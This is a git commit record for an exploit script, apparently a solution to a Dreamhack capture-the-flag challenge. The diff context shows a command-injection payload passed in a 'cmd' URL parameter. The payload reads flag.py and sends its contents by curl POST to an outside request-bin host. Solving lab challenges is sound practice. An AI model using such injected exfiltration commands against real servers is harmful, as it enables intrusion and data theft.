bb5413f1e82c38479cf9500b74d4385231c40a3f
Hueok <124287568+Hueok@users.noreply.github.com>
2023-07-22 02:38:37 +0900

    solve

--- last/exp.py
+++ last/exp.py
@@ -4,7 +4,6 @@ bin_url = 'https://oqwerdj.request.dreamhack.games'
 server_url = 'http://host1.dreamhack.games:13639/'
 shell = f'data=$(cat flag.py);curl --request POST {bin_url} -d "$data"'
 
-
 req = f'{server_url}?cmd={shell}'
 
 resp = requests.head(req)
